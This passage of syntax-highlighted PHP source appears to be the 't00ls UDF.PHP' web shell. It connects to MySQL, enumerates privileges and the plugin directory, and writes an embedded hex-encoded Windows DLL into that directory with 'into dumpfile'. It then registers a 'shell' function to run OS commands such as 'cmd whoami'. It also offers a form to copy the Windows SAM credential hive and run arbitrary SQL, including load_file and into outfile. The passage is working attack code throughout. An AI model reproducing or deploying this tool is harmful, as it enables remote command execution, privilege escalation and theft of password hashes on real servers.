<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br>        <span class="hljs-variable">$db</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>        <span class="hljs-variable">$uid</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br>        <span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br>        <span class="hljs-variable">$db</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>    &#125;<br>    <span class="hljs-variable">$conn</span> = mysql_connect(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$uid</span>,<span class="hljs-variable">$pwd</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>        <span class="hljs-keyword">echo</span> mysql_error().<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>        vConn();<br>        <span class="hljs-keyword">exit</span>();<br>    &#125; <br>    mysql_select_db(<span class="hljs-variable">$db</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> mysql_error().<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>        vConn();<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-variable">$host</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$uid</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>] = <span class="hljs-variable">$pwd</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;db&#x27;</span>] = <span class="hljs-variable">$db</span>;<br>    <span class="hljs-comment">//mysql_query(&#x27;set names utf8&#x27;);</span><br>    showM(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$close</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$conn</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;db&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notsame&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;over51&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;plugindir&#x27;</span>]);<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]; <br>    <span class="hljs-variable">$filename</span> = end(explode(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-variable">$url</span>));  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;location.href = &quot;&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;?rn=&quot;+Math.random()&lt;/script&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">showM</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$close</span> = <span class="hljs-literal">true</span></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;b&gt;t00ls UDF.PHP&lt;/b&gt;&lt;/center&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;logout&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Logout&quot;&gt;&lt;/form&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&#x27;</span>;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select concat(\&#x27;&lt;b&gt;user()&lt;/b&gt;:\&#x27;,user()) as m union select concat(\&#x27;&lt;b&gt;database():&lt;/b&gt;\&#x27;,database()) union select concat(\&#x27;&lt;b&gt;datadir&lt;/b&gt;:\&#x27;,@@datadir) union select concat(\&#x27;&lt;b&gt;basedir&lt;/b&gt;:\&#x27;,@@basedir) union select concat(\&#x27;&lt;b&gt;version()&lt;/b&gt;:\&#x27;,version()) ;&#x27;</span>;<br>    <span class="hljs-variable">$meta</span> = mysql_query(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-variable">$tmp</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$meta</span>,MYSQL_ASSOC)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tmp</span> == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$tmp</span> = <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;m&#x27;</span>],strpos(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;m&#x27;</span>],<span class="hljs-string">&#x27;@&#x27;</span>)+<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$h</span> != <span class="hljs-string">&#x27;localhost&#x27;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &lt;b&gt;&lt;i&gt;&lt;font color=green&gt;[web and db is not the same server.]&lt;/font&gt;&lt;/i&gt;&lt;/b&gt;&#x27;</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notsame&#x27;</span>] = <span class="hljs-string">&#x27;true&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;b&gt;plugin_dir&lt;/b&gt;:&#x27;</span>;<br>    <span class="hljs-variable">$meta</span> = mysql_query(<span class="hljs-string">&#x27;show variables like &quot;plugin_dir&quot;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_num_rows(<span class="hljs-variable">$meta</span>)==<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color=white&gt;mysql is under 5.1 , &#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notsame&#x27;</span>]))<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; u can dump udf.dll to any directory in follow paths&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/font&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//over 5.1</span><br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;over51&#x27;</span>] = <span class="hljs-string">&#x27;true&#x27;</span>;<br>        <span class="hljs-variable">$row</span> = mysql_fetch_row(<span class="hljs-variable">$meta</span>);<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;plugindir&#x27;</span>] = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\\\\&#x27;</span>,str_replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>])).<span class="hljs-string">&#x27;\\\\udf.dll&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color=white&gt;&#x27;</span>.str_replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]).<span class="hljs-string">&#x27;&lt;/font&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; (mysql over 5.1, udf.dll can only dump to plugin_dir) &#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notsame&#x27;</span>])) <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &lt;font&gt;&lt;b&gt;&lt;i&gt;[maybe dump dll will be failed!]&lt;/i&gt;&lt;/b&gt;&lt;/font&gt;&#x27;</span>;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!file_exists(str_replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]))) <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &lt;a href=&quot;?action=cplug&amp;dir=&#x27;</span>.base64_encode(str_replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>])).<span class="hljs-string">&#x27;&quot;&gt;Create PluginDir&lt;/a&gt;&#x27;</span>;<br>            <span class="hljs-keyword">else</span> <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; exists!&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notsame&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;over51&#x27;</span>]))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;b&gt;path&lt;/b&gt;:&lt;font color=green&gt;&lt;b&gt;&#x27;</span>.getenv(<span class="hljs-string">&#x27;path&#x27;</span>).<span class="hljs-string">&#x27;&lt;/b&gt;&lt;/font&gt;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$meta</span> = mysql_query(<span class="hljs-string">&#x27;select 1,1,1,1 from mysql.user union select * from mysql.func&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_num_rows(<span class="hljs-variable">$meta</span>)==<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;b&gt;Mysql.Func&lt;/b&gt; : &lt;font color=white&gt;&lt;b&gt;&lt;i&gt;&lt;font color=red&gt;dont exist!&lt;/font&gt;&lt;/i&gt;&lt;/b&gt;&lt;/font&gt; must &lt;a href=&quot;?action=func&quot;&gt;create&lt;/a&gt; mysql.func first!&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;b&gt;Mysql.Func&lt;/b&gt; : &lt;font color=green&gt;exist!&lt;/font&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;b&gt;grants&lt;/b&gt; : &lt;font color=white&gt;&#x27;</span>;<br>    <span class="hljs-variable">$meta</span> = mysql_query(<span class="hljs-string">&#x27;show grants;&#x27;</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = mysql_fetch_row(<span class="hljs-variable">$meta</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/font&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$close</span>)<br>        mysql_close(<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (get_magic_quotes_gpc()) <br>            <span class="hljs-variable">$path</span> = stripslashes(<span class="hljs-variable">$path</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$path</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;plugindir&#x27;</span>]) ? <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;plugindir&#x27;</span>] : <span class="hljs-string">&#x27;c:\\\\windows\\\\system32\\\\udf.dll&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;install&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;60&quot; value=&quot;&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Dump UDF&quot;&gt;&lt;/form&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;exec&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;dump&quot; value=&quot;d&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;sql&quot; size=&quot;60&quot; value=&quot;CREATE FUNCTION shell RETURNS STRING SONAME \&#x27;udf.dll\&#x27;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Create Function&quot;&gt;&lt;/form&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;copy&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;c:\\\\WINDOWS\\\\repair\\\\sam&quot; name=&quot;source&quot; size=30&gt;  &lt;input type=&quot;text&quot; name=&quot;target&quot; size=30&gt; &lt;input type=&quot;submit&quot; value=&quot;Copy&quot;&gt; &lt;font color=white&gt;please convert \\ to \\\\&lt;/font&gt;&lt;/form&gt;&lt;/div&gt;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sql&#x27;</span>]))<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select * from mysql.user&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>        <span class="hljs-variable">$sql</span> = stripslashes(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dump&#x27;</span>]))<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select shell(\&#x27;cmd\&#x27;,\&#x27;whoami\&#x27;)&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;exec&quot;&gt;&lt;textarea id=&quot;sql2&quot; cols=&quot;100&quot; rows=&quot;5&quot; name=&quot;sql&quot;&gt;&#x27;</span>.<span class="hljs-variable">$sql</span>.<span class="hljs-string">&#x27;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Mysql_query&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Load_File&quot; onclick=&quot;loadfile()&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Into OutFile&quot; onclick=&quot;outfile()&quot;&gt;&lt;/form&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cplug</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-variable">$path</span> = base64_decode(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$arr</span> = explode(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$p</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$err</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>,<span class="hljs-variable">$count</span> = count(<span class="hljs-variable">$arr</span>);<span class="hljs-variable">$index</span>&lt;<span class="hljs-variable">$count</span>;<span class="hljs-variable">$index</span>++) &#123;<br>        <span class="hljs-variable">$p</span> .= (<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$index</span>] . <span class="hljs-string">&#x27;\\&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$p</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!mkdir(<span class="hljs-variable">$p</span>)) &#123;<br>                <span class="hljs-variable">$err</span> = <span class="hljs-string">&#x27;create &#x27;</span>.<span class="hljs-variable">$p</span>.<span class="hljs-string">&#x27;failed !&#x27;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    conn();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$err</span> != <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$err</span>);<br>    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$path</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;plugin_dir create success !&#x27;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;plugin_dir create failed !&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execsql</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$conn</span> = conn(<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>        <span class="hljs-variable">$sql</span> = stripslashes(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$rs</span> = mysql_query(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">echo</span> mysql_info(<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">if</span> (@mysql_num_rows(<span class="hljs-variable">$rs</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;table border=&quot;1&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$cols</span> = mysql_num_fields(<span class="hljs-variable">$rs</span>);<br>        <span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$index</span> &lt; <span class="hljs-variable">$cols</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;th&gt;&#x27;</span>.mysql_field_name(<span class="hljs-variable">$rs</span>,<span class="hljs-variable">$index</span>).<span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>            <span class="hljs-variable">$index</span> ++;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = mysql_fetch_row(<span class="hljs-variable">$rs</span>)) &#123;<br>            <span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$index</span> &lt; <span class="hljs-variable">$cols</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> str_replace(chr(<span class="hljs-number">13</span>),<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>,htmlspecialchars(<span class="hljs-variable">$row</span>[<span class="hljs-variable">$index</span>]));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                <span class="hljs-variable">$index</span> ++;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/table&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">echo</span> mysql_error();<br>    mysql_close(<span class="hljs-variable">$conn</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cp</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$conn</span> = conn(<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$source</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;source&#x27;</span>];<br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;target&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (get_magic_quotes_gpc()) &#123;<br>        <span class="hljs-variable">$source</span> = stripslashes(<span class="hljs-variable">$source</span>);<br>        <span class="hljs-variable">$target</span> = stripslashes(<span class="hljs-variable">$target</span>);<br>    &#125;<br>    mysql_query(<span class="hljs-string">&#x27;select unhex(hex(load_file(&quot;&#x27;</span>.<span class="hljs-variable">$source</span>.<span class="hljs-string">&#x27;&quot;))) into dumpfile &quot;&#x27;</span>.<span class="hljs-variable">$target</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">echo</span> mysql_error().<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;done !&#x27;</span>;<br>    mysql_close(<span class="hljs-variable">$conn</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">install</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-comment">//dump udf.dll</span><br>    <span class="hljs-variable">$conn</span> = conn(<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (get_magic_quotes_gpc()) <br>        <span class="hljs-variable">$path</span> = stripslashes(<span class="hljs-variable">$path</span>);<br>    mysql_query(<span class="hljs-string">&#x27;create table udftmp (c blob)&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> mysql_error().<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>        mysql_query(<span class="hljs-string">&#x27;drop table udftmp&#x27;</span>);<br>        mysql_close(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    mysql_query(<span class="hljs-string">&#x27;insert into udftmp values(convert(0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000080100000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000007148657F35290B2C35290B2C35290B2C35290B2C3F290B2CF626562C31290B2C4E35072C34290B2C5A36012C31290B2CB635052C36290B2C5A360F2C31290B2C5A36002C34290B2C5736182C3E290B2C35290A2C56290B2CF6266B2C38290B2CF626572C34290B2CF626512C34290B2C5269636835290B2C00000000000000000000000000000000504500004C010400BFC7514B0000000000000000E0000E210B01070A00220000001C0000000000002D300000001000000040000000000010001000000002000004000000000000000400000000000000008000000004000000000000020000000000100000100000000010000010000000000000100000002052000070000000A44A0000B40000000000000000000000000000000000000000000000000000000070000064020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000004C0100000000000000000000000000000000000000000000000000002E746578740000000C210000001000000022000000040000000000000000000000000000200000602E7264617461000090120000004000000014000000260000000000000000000000000000400000402E64617461000000500000000060000000020000003A0000000000000000000000000000400000C02E72656C6F630000080400000070000000060000003C00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000558BEC83EC14578D45FC506A28FF156040001050FF151C4000108B450CF7D81BC083E0028945F88D45F050FF7508C745EC010000006A00FF15204000106A006A006A108D45EC506A00FF75FCFF15244000108BF885FF7500FF75FCFF15A44000108BC75FC9C3558BEC81EC8004000053568B35804000105733DB538D45D4508D45EC5033FF8D45F44750885DFF885DFEC745D40C000000895DD8897DDCFFD685C00F84F3000000538D45D4508D45E4508D45F050FFD685C00F84DC0000008D458050FF15844000108B45F08945B88B45EC8945C08945BC8D45C4508D458050535353575353FF750CC745AC010100005366895DB0FF158840001085C00F84980000008B3534400010C645FF01FFD68B3D8C4000108945E8EB67395DF87642B8000400003945F872038945F8538D45E050FF75F88D8580FBFFFF50FF75F4FF159040001085C07453FF75E08B4D088B018D9580FBFFFF52FF5004FFD68945E8EB1853FF75C4FF159440001085C0742CFFD62B45E83B4510731E6A07FF159C400010538D45F850535353FF75F4895DF8FFD785C07585EB04C645FE01FF15A0400010385DFF8B35A44000108BF8741E385DFE740F395D14740A53FF75C4FF15A8400010FF75C8FFD6FF75C4FFD6395DF07405FF75F0FFD6395DEC7405FF75ECFFD6395DE47405FF75E4FFD6395DF47405FF75F4FFD657FF15B04000105F5E33C05BC9C3837C24040274138B44240C8B08686041001050FF51085959EB48568B74240C57566A02E8A2010000050004000050FF1508410010FF76048BF8685041001057FF15044100106A0168E02E000057FF742438E80FFEFFFF57FF150041001083C42C5F5E33C0C3837C24040274138B44240C8B08687C41001050FF51085959EB1A8B4424086A0068D0070000FF7004FF742418E8CFFDFFFF83C41033C0C38BC18B4C24048948088B4C240889480C8A4C240CC70098410010884804C7401002000000C20C00C70198410010C3F644240401568BF1C70698410010740756E8021C0000598BC65EC20400565733FF8BF147397E087E52807E04008B460C8B04B88A08741D80F92F740580F92D753440803800742EFF74240C50FF150C410010EB1B80F92F740580F92D7517408038007411FF74240C50FF15F840001085C05959740D473B7E087CAE32C05F5EC20400B001EBF756578BF1836614006A025F397E087E62807E04008B460C8B44B8